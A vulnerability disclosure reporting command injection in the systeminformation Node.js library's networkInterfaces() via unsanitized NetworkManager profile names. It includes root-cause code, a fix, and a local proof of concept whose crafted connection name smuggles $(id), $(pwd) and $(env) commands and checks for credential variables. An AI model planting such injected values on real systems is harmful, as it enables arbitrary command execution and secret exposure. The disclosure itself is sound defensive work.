summary: "Systeminformation vulnerable to Linux command injection in networkInterfaces() via\
  \ unsanitized NetworkManager connection profile name\n## Summary\n\nOn Linux, `systeminformation`\
  \ is vulnerable to command injection in `networkInterfaces()` when an **active NetworkManager\
  \ connection profile name** contains shell metacharacters.\n\nThis is not caused by a caller\
  \ passing attacker-controlled arguments into `networkInterfaces()`. The vulnerable value is\
  \ obtained internally from real `nmcli device status` output. The library sanitizes the network\
  \ interface name before using it in shell commands, but it does **not** apply equivalent sanitization\
  \ to the parsed NetworkManager connection profile name. That unsanitized `connectionName`\
  \ is then interpolated into three shell command strings executed through `execSync()`.\n\n\
  This issue was validated locally against **real NetworkManager** and **real `nmcli`**. Calling\
  \ only:\n\n```js\nrequire('./lib').networkInterfaces()\n```\n\nwas enough to trigger execution.\
  \ The injected command ran with the privileges of the calling Node.js process.\n\n## Affected\
  \ Component & Versions\n\n**Affected component:**\n\n- [`lib/network.js`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js)\n\
  - `networkInterfaces()`\n- Linux NetworkManager / `nmcli` handling\n\n\n## Impact & Threat\
  \ Model\n\n**Confirmed impact:**\n\nAn attacker who can create or rename an **active NetworkManager\
  \ connection profile** can execute arbitrary shell commands when a Node.js process using `systeminformation`\
  \ calls `networkInterfaces()`.\n\n**Confirmed realistic affected deployments include:**\n\n\
  - local inventory agents\n- monitoring agents\n- diagnostics tools\n- admin dashboard backends\
  \ collecting host information\n- privileged local desktop or device-management agents\n\n\
  If such a process runs with elevated privileges, the injected command executes with those\
  \ same elevated privileges.\n\n**Confirmed facts:**\n\n- The payload was stored as a real\
  \ NetworkManager connection profile name.\n- Real `nmcli device status` returned the name\
  \ unchanged.\n- `networkInterfaces()` parsed that value and reused it in shell commands.\n\
  - The injected command ran as the calling Node.js process.\n- Environment key categories were\
  \ reachable from the injected process context.\n\n**Not claimed:**\n\n- No remote exploitation\
  \ claim is made.\n- No `AV:N` or `AV:A` claim is made.\n- No SSID-to-connection-name attack\
  \ path is claimed.\n- File-delivery-only `.nmconnection` import was not confirmed as a remote\
  \ or unauthenticated path.\n\n## Root Cause Analysis\n\nThe root cause is inconsistent trust\
  \ handling between the Linux interface name and the NetworkManager connection profile name.\n\
  \nThe interface name is sanitized before it is embedded into shell commands:\n\n```js\nconst\
  \ iface = dev.split(':')[0].trim();\nconst s = util.isPrototypePolluted() ? '---' : util.sanitizeShellString(iface);\n\
  ```\n\nHowever, the NetworkManager connection name is parsed from command output and later\
  \ reused without equivalent sanitization:\n\n```js\nconst connectionNameLines = resultFormat.split('\
  \ ').slice(3);\nconst connectionName = connectionNameLines.join(' ');\nreturn connectionName\
  \ !== '--' ? connectionName : '';\n```\n\nThat is unsafe because NetworkManager profile names\
  \ can contain shell metacharacters. Quoting the value inside `\"${connectionName}\"` does\
  \ not make it safe. A connection name containing `\"`, `$()`, `;`, backticks, or similar shell\
  \ syntax can break out of the intended argument context or trigger command substitution.\n\
  \nThe vulnerable code executes through `execSync()`, which invokes a shell for command strings.\
  \ As a result, interpolating `connectionName` into the command string creates a command-injection\
  \ sink.\n\n## Exact Code Flow & File Paths\n\n**Source:** [`lib/network.js:538-544`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L538-L544)\n\
  \n```js\nfunction getLinuxIfaceConnectionName(interfaceName) {\n  const cmd = `nmcli device\
  \ status 2>/dev/null | grep ${interfaceName}`;\n\n  try {\n    const result = execSync(cmd,\
  \ util.execOptsLinux).toString();\n    const resultFormat = result.replace(/\\s+/g, ' ').trim();\n\
  \    const connectionNameLines = resultFormat.split(' ').slice(3);\n```\n\nThe parsed value\
  \ is then returned as `connectionName`.\n\n**Trigger:** [`lib/network.js:987-991`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L987-L991)\n\
  \n```js\nlines = execSync(cmd, util.execOptsLinux).toString().split('\\n');\nconst connectionName\
  \ = getLinuxIfaceConnectionName(ifaceSanitized);\ndhcp = getLinuxIfaceDHCPstatus(ifaceSanitized,\
  \ connectionName, _dhcpNics);\ndnsSuffix = getLinuxIfaceDNSsuffix(connectionName);\nieee8021xAuth\
  \ = getLinuxIfaceIEEE8021xAuth(connectionName);\n```\n\n**Sink 1:** [`lib/network.js:620`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L620-L620)\n\
  \n```js\nconst cmd = `nmcli connection show \"${connectionName}\" 2>/dev/null | grep ipv4.method;`;\n\
  ```\n\n**Sink 2:** [`lib/network.js:660`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L660-L660)\n\
  \n```js\nconst cmd = `nmcli connection show \"${connectionName}\" 2>/dev/null | grep ipv4.dns-search;`;\n\
  ```\n\n**Sink 3:** [`lib/network.js:676`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/network.js#L676-L676)\n\
  \n```js\nconst cmd = `nmcli connection show \"${connectionName}\" 2>/dev/null | grep 802-1x.eap;`;\n\
  ```\n\nThere are **three distinct exploitable `connectionName` sinks**.\n\n\n## Proof of Concept\
  \ (PoC) & Reproduction Steps\n\nThe following PoC is harmless and local-only. It uses a dummy\
  \ NetworkManager connection and writes proof files under /tmp.\n\nRun from the project root:\n\
  \n```bash\ncd /path/to/systeminformation\n```\n\nConfirm proof files do not already exist:\n\
  \n```bash\ntest -e /tmp/si-nm-id-proof && echo EXISTS || echo NOT_YET\ntest -e /tmp/si-nm-pwd-proof\
  \ && echo EXISTS || echo NOT_YET\ntest -e /tmp/si-nm-env-proof && echo EXISTS || echo NOT_YET\n\
  ```\n\nCreate a malicious NetworkManager dummy profile:\n\n```bash\nnmcli connection add type\
  \ dummy ifname si-nmghsa0 con-name 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)'\n\
  ```\n\nAssign a documentation-only address so Node’s os.networkInterfaces() sees the dummy\
  \ interface:\n\n```bash\nnmcli connection modify 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)'\
  \ \\\n  ipv4.method manual \\\n  ipv4.addresses 192.0.2.253/32 \\\n  ipv6.method disabled\n\
  ```\n\nActivate the profile:\n\n```bash\nnmcli connection up 'si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)'\n\
  ```\n\nConfirm real nmcli exposes the malicious connection name unchanged:\n\n```bash\nnmcli\
  \ device status | grep si-nmghsa0\n```\n\nExpected relevant output includes the active connection\
  \ name:\n\n```text\nsi-nmghsa0  dummy  connected  si-ghsa$(id>/tmp/si-nm-id-proof)$(pwd>/tmp/si-nm-pwd-proof)$(env>/tmp/si-nm-env-proof)\n\
  ```\n\nTrigger the vulnerable library path with no attacker-controlled function argument:\n\
  \n```bash\nnode -e \"const si=require('./lib'); si.networkInterfaces().then((interfaces)=>{const\
  \ item=interfaces.find((entry)=>entry.iface==='si-nmghsa0'); console.log('saw_dummy_iface='\
  \ + Boolean(item)); if (item)\nconsole.log(JSON.stringify({iface:item.iface, ip4:item.ip4,\
  \ dhcp:item.dhcp, dnsSuffix:item.dnsSuffix, ieee8021xAuth:item.ieee8021xAuth}));}).catch((e)=>{console.error(e);\
  \ process.exit(1);});\"\n```\n\nConfirm command execution:\n\n```bash\ntest -e /tmp/si-nm-id-proof\
  \ && echo CONFIRMED || echo FAILED\ncat /tmp/si-nm-id-proof\ncat /tmp/si-nm-pwd-proof\n```\n\
  \nInspect environment key categories without printing secret values:\n\n```bash\nnode -e \"\
  \nconst fs=require('fs');\nconst keys=fs.readFileSync('/tmp/si-nm-env-proof','utf8')\n  .split(/\\\
  n/).map(l=>l.split('=')[0]).filter(Boolean);\nconst wanted=['PATH','USER','HOME','SHELL','PWD','SSH_AUTH_SOCK','GITHUB_TOKEN','NPM_TOKEN','AWS_ACCESS_KEY_ID'];\n\
  console.log('env_key_count='+keys.length);\nconsole.log('present_categories='+wanted.filter(k=>keys.includes(k)).join(','));\n\
  \"\n```\n\nvalidated evidence:\n\n```text\nsaw_dummy_iface=true\nuid=1000(smart) gid=1000(smart)\n\
  pwd=/home/smart/Downloads/systeminformation-master\nenv_key_count=74\npresent_categories=PATH,USER,HOME,SHELL,PWD,SSH_AUTH_SOCK\n\
  ```\n\n## Local Validation Summary & Aggregate Reachability\n\nValidation was performed against\
  \ **real NetworkManager** and **real `nmcli`**. The primary proof did not rely on a PATH stub.\n\
  \n**Observed behavior:**\n\n- The malicious profile was accepted by NetworkManager.\n- The\
  \ active connection name appeared unchanged in `nmcli device status`.\n- Calling only `require('./lib').networkInterfaces()`\
  \ triggered execution.\n- The proof artifacts were created only after the library call.\n\
  - The `id` output matched the calling Node.js process identity.\n- The `pwd` output matched\
  \ the Node.js process working directory.\n- The environment proof demonstrated access to process-environment\
  \ categories without printing secret values.\n\n**Aggregate API reachability:**\n\n- [`lib/index.js:94`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L94-L94):\
  \ `getStaticData()` reaches `network.networkInterfaces()` as part of static data collection.\n\
  - [`lib/index.js:307`](https://github.com/sebhildebrandt/systeminformation/blob/ed1cac537c59763301d802ad1b55b4b8581e7553/lib/index.js#L307-L307):\
  \ `getAllData()` reaches `getStaticData()` first.\n\nDuring local validation, an aggregate\
  \ runtime attempt later hit an unrelated `osinfo.js` error in that environment. Because of\
  \ that, aggregate source reachability is confirmed, but aggregate call completion was **not**\
  \ used as the primary exploit proof.\n\n## Why This Is Not Intended Behavior\n\n`networkInterfaces()`\
  \ is documented and expected to return network interface metadata such as interface name,\
  \ IP addresses, DHCP state, DNS suffix, and IEEE 802.1X status.\n\nThe library already shows\
  \ an intent to protect shell command construction by sanitizing interface names before shell\
  \ use. The missing sanitization for `connectionName` is inconsistent with that defensive pattern.\n\
  \nExecuting shell commands embedded in a NetworkManager profile name is not a documented feature,\
  \ not required to return network metadata, and not an expected design tradeoff. This is a\
  \ command injection vulnerability caused by unsafe shell-string construction.\n\n## Recommended\
  \ Fix\n\nAvoid shell interpolation entirely for NetworkManager calls.\n\nReplace shell command\
  \ strings with `execFileSync()` or `spawnSync()` using argument arrays. For example:\n\n```js\n\
  const { execFileSync } = require('child_process');\n\nconst output = execFileSync(\n  'nmcli',\n\
  \  ['connection', 'show', connectionName],\n  util.execOptsLinux\n).toString();\n```\n\n**Recommended\
  \ code-level changes:**\n\n- Replace `nmcli device status 2>/dev/null | grep ${interfaceName}`\
  \ with argument-array execution and filter rows in JavaScript.\n- Replace every `nmcli connection\
  \ show \"${connectionName}\" | grep ...` shell string with argument-array execution.\n- Parse\
  \ `ipv4.method`, `ipv4.dns-search`, and `802-1x.eap` in JavaScript instead of using shell\
  \ `grep`.\n- Treat NetworkManager profile names as untrusted input even though they originate\
  \ from local system state.\n- Do not rely on quoting or escaping as the main mitigation. Argument-array\
  \ execution is the correct fix.\n\n## Regression Test Ideas\n\nAdd Linux-specific tests for\
  \ NetworkManager connection names containing shell metacharacters.\n\n**Suggested malicious\
  \ connection names:**\n\n- `name$(...)`\n- `name\"; ...; #`\n- ``name`...``` \n- `name|...`\n\
  - `name;...`\n\n**Expected behavior after the fix:**\n\n- `networkInterfaces()` completes\
  \ without executing shell syntax from the connection name.\n- No marker files or equivalent\
  \ side effects are produced.\n- The function either returns metadata for the interface or\
  \ safely returns unknown/default values for fields that cannot be queried.\n- Tests cover\
  \ all three current sink helpers:\n  - DHCP lookup\n  - DNS suffix lookup\n  - IEEE 802.1x\
  \ auth lookup\n\nFor unit-level coverage, mock the NetworkManager command wrapper so that\
  \ `nmcli device status` returns a connection name containing metacharacters, then assert that\
  \ subsequent calls use argument arrays rather than shell strings.\n\n## Credit request\nIf\
  \ you publish an advisory or assign a CVE, please credit me as:\n\nAli Firas (thesmartshadow)\
  \  - https://www.smartshadow.dev"
